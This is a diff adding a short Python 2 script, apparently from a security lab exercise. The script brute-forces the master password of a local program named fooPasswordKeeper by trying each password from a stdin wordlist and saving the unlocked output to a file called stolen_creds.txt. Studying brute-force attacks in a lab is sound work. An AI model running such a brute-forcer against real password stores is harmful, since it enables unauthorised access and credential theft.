@@ -1,0 +1,40 @@
+#!/usr/bin/python
+
+# Reads in passwords from stin and uses each password as a candidate for a 
+# subprocess call to find a master password. Once the password is found, the
+# information returned from the subprocess is inserted into a file called 
+# stolen_creds.txt 
+
+import sys
+import subprocess
+
+passwordCandidates = []
+
+# Read in stdin and build list of candidate passwords
+for line in sys.stdin:
+    passwordCandidates.append(line)
+
+total = len(passwordCandidates)
+print "Amount of passwords: ", total
+counter = 0
+
+# For each candidate, run the fooPasswordKeeper program and enter it
+for line in passwordCandidates:
+    # Print out the program's process for the user to see
+    if ((counter % 10000) == 0):
+        print "% ", float(counter)/float(total)
+
+    # Start the fooPasswordKeeper program as a subprocess and enter the 
+    # candidate into it to be tested
+    process = subprocess.Popen("/playpen/fooPasswordKeeper", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = process.communicate(input=line)[0]
+
+    # If we found the password, put subprocess output into separate file 
+    # called stolen_creds.txt and exit the program
+    if "FAIL" not in output:
+        print "Success! Password is: ", line
+        subprocess.call(["touch", "stolen_creds.txt"])
+        fileObject = open("stolen_creds.txt", "w")
+        print >>fileObject, output
+        break
+    counter += 1
